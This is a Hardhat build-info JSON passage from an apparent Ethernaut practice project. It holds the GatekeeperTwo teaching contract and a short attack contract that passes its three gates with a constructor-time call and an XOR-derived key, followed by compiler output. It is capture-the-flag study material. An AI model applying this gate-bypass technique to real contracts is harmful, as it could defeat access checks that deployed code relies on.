{
	"id": "cb33aaa546073cca2b6b0cf393bb9b64",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.6",
	"solcLongVersion": "0.6.6+commit.6c089d02",
	"input": {
		"language": "Solidity",
		"sources": {
			"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwoAttack.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"./GatekeeperTwo.sol\";\n\ncontract GatekeeperTwoAttack {\n    GatekeeperTwo target;\n    bool public result;\n\n    constructor(address _address) public {\n        target = GatekeeperTwo(_address);\n\n        //* xor is associative i.e. -> a ^ b = c => a ^ c = b\n        bytes8 gateKey = bytes8(\n            uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (uint64(0) - 1)\n        );\n\n        // _address.call(abi.encodeWithSignature(\"enter(bytes8)\", gateKey));\n        result = target.enter(gateKey);\n    }\n}\n"
			},
			"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n//* Rinkeby address: 0x6a80Bb86cccB7795e3bCA87E87b31F5530e6593b\n//* Goerli address: 0x8CF8Ad14F709ad3369e260903dE67328F0106494\n\ncontract GatekeeperTwo {\n    address public entrant;\n\n    modifier gateOne() {\n        require(msg.sender != tx.origin);\n        _;\n    }\n\n    modifier gateTwo() {\n        uint x;\n        assembly {\n            x := extcodesize(caller())\n        }\n        require(x == 0);\n        _;\n    }\n\n    modifier gateThree(bytes8 _gateKey) {\n        require(\n            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^\n                uint64(_gateKey) ==\n                uint64(0) - 1\n        );\n        _;\n    }\n\n    function enter(bytes8 _gateKey)\n        public\n        gateOne\n        gateTwo\n        gateThree(_gateKey)\n        returns (bool)\n    {\n        entrant = tx.origin;\n        return true;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol": {
				"GatekeeperTwo": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "bytes8",
									"name": "_gateKey",
									"type": "bytes8"
								}
							],
							"name": "enter",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "entrant",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":185:897  contract GatekeeperTwo {... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":5:14   */\n  dup1\n    /* \"--CODEGEN--\":2:4   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":27:28   */\n  0x00\n    /* \"--CODEGEN--\":24:25   */\n  dup1\n    /* \"--CODEGEN--\":17:29   */\n  revert\n    /* \"--CODEGEN--\":2:4   */\ntag_1:\n    /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":185:897  contract GatekeeperTwo {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":185:897  contract GatekeeperTwo {... */\n      mstore(0x40, 0x80)\n      callvalue\n        /* \"--CODEGEN--\":5:14   */\n      dup1\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_1\n      jumpi\n        /* \"--CODEGEN--\":27:28   */\n      0x00\n        /* \"--CODEGEN--\":24:25   */\n      dup1\n        /* \"--CODEGEN--\":17:29   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_1:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":185:897  contract GatekeeperTwo {... */\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3370204e\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9db31d77\n      eq\n      tag_4\n      jumpi\n    tag_2:\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":704:895  function enter(bytes8 _gateKey)... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":15:17   */\n      0x20\n        /* \"--CODEGEN--\":10:13   */\n      dup2\n        /* \"--CODEGEN--\":7:18   */\n      lt\n        /* \"--CODEGEN--\":4:6   */\n      iszero\n      tag_6\n      jumpi\n        /* \"--CODEGEN--\":31:32   */\n      0x00\n        /* \"--CODEGEN--\":28:29   */\n      dup1\n        /* \"--CODEGEN--\":21:33   */\n      revert\n        /* \"--CODEGEN--\":4:6   */\n    tag_6:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":704:895  function enter(bytes8 _gateKey)... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      not(0xffffffffffffffffffffffffffffffffffffffffffffffff)\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_7\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      dup1\n      dup3\n      iszero\n      iszero\n      iszero\n      iszero\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":214:236  address public entrant */\n    tag_4:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":704:895  function enter(bytes8 _gateKey)... */\n    tag_7:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":828:832  bool */\n      0x00\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":294:303  tx.origin */\n      origin\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":280:303  msg.sender != tx.origin */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":280:290  msg.sender */\n      caller\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":280:303  msg.sender != tx.origin */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":272:304  require(msg.sender != tx.origin) */\n      tag_11\n      jumpi\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":272:304  require(msg.sender != tx.origin) */\n    tag_11:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":357:363  uint x */\n      0x00\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":413:421  caller() */\n      caller\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":401:422  extcodesize(caller()) */\n      extcodesize\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":396:422  x := extcodesize(caller()) */\n      swap1\n      pop\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":454:455  0 */\n      0x00\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":449:450  x */\n      dup2\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":449:455  x == 0 */\n      eq\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":441:456  require(x == 0) */\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":441:456  require(x == 0) */\n    tag_13:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":801:809  _gateKey */\n      dup3\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":669:670  1 */\n      0x01\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":664:665  0 */\n      0x00\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":657:670  uint64(0) - 1 */\n      sub\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":547:670  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^... */\n      0xffffffffffffffff\n      and\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":628:636  _gateKey */\n      dup2\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":621:637  uint64(_gateKey) */\n      0xc0\n      shr\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":588:598  msg.sender */\n      caller\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":571:599  abi.encodePacked(msg.sender) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x60\n      shl\n      dup2\n      mstore\n      0x14\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n        /* \"--CODEGEN--\":49:53   */\n      0x20\n        /* \"--CODEGEN--\":39:46   */\n      dup2\n        /* \"--CODEGEN--\":30:37   */\n      dup4\n        /* \"--CODEGEN--\":26:47   */\n      sub\n        /* \"--CODEGEN--\":22:54   */\n      sub\n        /* \"--CODEGEN--\":13:20   */\n      dup2\n        /* \"--CODEGEN--\":6:55   */\n      mstore\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":571:599  abi.encodePacked(msg.sender) */\n      swap1\n      0x40\n      mstore\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":561:600  keccak256(abi.encodePacked(msg.sender)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":547:602  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) */\n      0xc0\n      shr\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":547:637  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^... */\n      xor\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":547:670  uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^... */\n      0xffffffffffffffff\n      and\n      eq\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":526:680  require(... */\n      tag_15\n      jumpi\n        /* \"--CODEGEN--\":12:13   */\n      0x00\n        /* \"--CODEGEN--\":9:10   */\n      dup1\n        /* \"--CODEGEN--\":2:14   */\n      revert\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":526:680  require(... */\n    tag_15:\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":858:867  tx.origin */\n      origin\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":848:855  entrant */\n      0x00\n      dup1\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":848:867  entrant = tx.origin */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":884:888  true */\n      0x01\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":877:888  return true */\n      swap3\n      pop\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":466:467  _ */\n      pop\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":314:315  _ */\n      pop\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":704:895  function enter(bytes8 _gateKey)... */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"practice/web3/CTFS/ethernaut/GatekeeperTwo/contracts/GatekeeperTwo.sol\":214:236  address public entrant */\n    tag_9:\n      0x00\n      dup1\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n\n    auxdata: 0xa264697066735822122052f28d8d0cbc2473097fae2a3c67c28c8ff92afed60ee1ec2bf7525707df22d364736f6c63430006060033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b5061025c806100206000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80633370204e1461003b5780639db31d771461009c575b600080fd5b6100826004803603602081101561005157600080fd5b81019080803577ffffffffffffffffffffffffffffffffffffffffffffffff191690602001909291905050506100e6565b604051808215151515815260200191505060405180910390f35b6100a4610201565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60003273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561012157600080fd5b6000333b90506000811461013457600080fd5b82600160000367ffffffffffffffff168160c01c33604051602001808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014019150506040516020818303038152906040528051906020012060c01c1867ffffffffffffffff16146101b657600080fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600192505050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122052f28d8d0cbc2473097fae2a3c67c28c8ff92afed60ee1ec2bf7525707df22d364736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x25C DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3370204E EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9DB31D77 EQ PUSH2 0x9C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x82 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA4 PUSH2 0x201 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x121 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 CALLER EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 EQ PUSH2 0x134 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 PUSH1 0x1 PUSH1 0x0 SUB PUSH8 0xFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0xC0 SHR CALLER PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0xC0 SHR XOR PUSH8 0xFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP3 POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSTORE CALLCODE DUP14 DUP14 0xC 0xBC 0x24 PUSH20 0x97FAE2A3C67C28C8FF92AFED60EE1EC2BF75257 SMOD 0xDF 0x22 0xD3 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "185:712:0:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;185:712:0;;;;;;;"
						},
						"deployedBytecode": {
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80633370204e1461003b5780639db31d771461009c575b600080fd5b6100826004803603602081101561005157600080fd5b81019080803577ffffffffffffffffffffffffffffffffffffffffffffffff191690602001909291905050506100e6565b604051808215151515815260200191505060405180910390f35b6100a4610201565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b60003273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16141561012157600080fd5b6000333b90506000811461013457600080fd5b82600160000367ffffffffffffffff168160c01c33604051602001808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660601b81526014019150506040516020818303038152906040528051906020012060c01c1867ffffffffffffffff16146101b657600080fd5b326000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600192505050919050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122052f28d8d0cbc2473097fae2a3c67c28c8ff92afed60ee1ec2bf7525707df22d364736f6c63430006060033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x3370204E EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0x9DB31D77 EQ PUSH2 0x9C JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x82 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH24 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xE6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0xA4 PUSH2 0x201 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 ORIGIN PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ ISZERO PUSH2 0x121 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 CALLER EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 EQ PUSH2 0x134 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP3 PUSH1 0x1 PUSH1 0x0 SUB PUSH8 0xFFFFFFFFFFFFFFFF AND DUP2 PUSH1 0xC0 SHR CALLER PUSH1 0x40 MLOAD PUSH1 0x20 ADD DUP1 DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x60 SHL DUP2 MSTORE PUSH1 0x14 ADD SWAP2 POP POP PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE DUP1 MLOAD SWAP1 PUSH1 0x20 ADD KECCAK256 PUSH1 0xC0 SHR XOR PUSH8 0xFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1B6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST ORIGIN PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP3 POP POP POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 MSTORE CALLCODE DUP14 DUP14 0xC 0xBC 0x24 PUSH20 0x97FAE2A3C67C28C8FF92AFED60EE1EC2BF75257 SMOD 0xDF 0x22 0xD3 PUSH5 0x736F6C6343 STOP MOD MOD STOP CALLER ",
							"sourceMap": "185:712:0:-:0;;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;185:712:0;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;704:191:0;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;704:191:0;;;;;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;214:22;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;704:191;828:4;294:9;280:23;;:10;:23;;;;272:32;;12:1:-1;9;2:12;272:32:0;357:6:::1;413:8;401:21;396:26;;454:1;449;:6;441:15;;12:1:-1;9::::0;2:12:::1;441:15:0;801:8:::2;669:1;664;657:13;547:123;;628:8;621:16;;588:10;571:28;;;;;;;;;;;;;;;;;;;;;49:4:-1;39:7;30;26:21;22:32;13:7;6:49;571:28:0;;;561:39;;;;;;547:55;;:90;:123;;;526:154;;12:1:-1;9::::0;2:12:::2;526:154:0;858:9:::3;848:7;::::0;:19:::3;;;;;;;;;;;;;;;;;;884:4;877:11;;466:1:::2;314::::1;704:191:::0;;;:::o;214:22::-;;;;;;;;;;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "120800",
								"executionCost": "165",
								"totalCost": "120965"
							},
							"external": {
								"enter(bytes8)": "22147",
								"entrant()": "1053"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 185,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 185,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 185,
									"end": 897,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 185,
									"end": 897,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 185,
									"end": 897,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 185,
									"end": 897,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 185,
									"end": 897,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 185,
									"end": 897,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 185,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 185,
									"end": 897,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 185,
									"end": 897,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 185,
									"end": 897,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
